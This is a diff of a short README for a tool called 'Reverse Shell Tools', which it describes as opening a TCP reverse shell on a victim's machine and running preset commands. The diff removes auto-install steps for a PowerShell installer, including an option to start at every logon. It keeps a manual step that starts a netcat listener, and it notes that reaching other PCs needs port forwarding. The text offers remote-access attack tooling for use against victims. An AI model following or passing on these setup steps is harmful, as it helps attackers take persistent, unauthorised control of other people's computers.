@@ -1,16 +1,8 @@
 # Reverse Shell Tools
 
 A simple tool to start a TCP reverse shell on the victoms mashine and run some pre-build commands.
-
-# Auto Install
-
-1. Download the install.ps1 from Releases
-
-2. run it with .\install.ps1 -Path "[InstallPath]" -Server [IP:Port]
-
-3. [?] There are additional parameters -Run (Runs the Script after install) -AutoStart (Starts the script automaticly after every logon)
  
-# Usage Manual
+# Manual Install
 
 1. Start a Listener Server (netcat: nc.exe -lp [port]) ; if you want tartget other pc's you need to forward your port
 
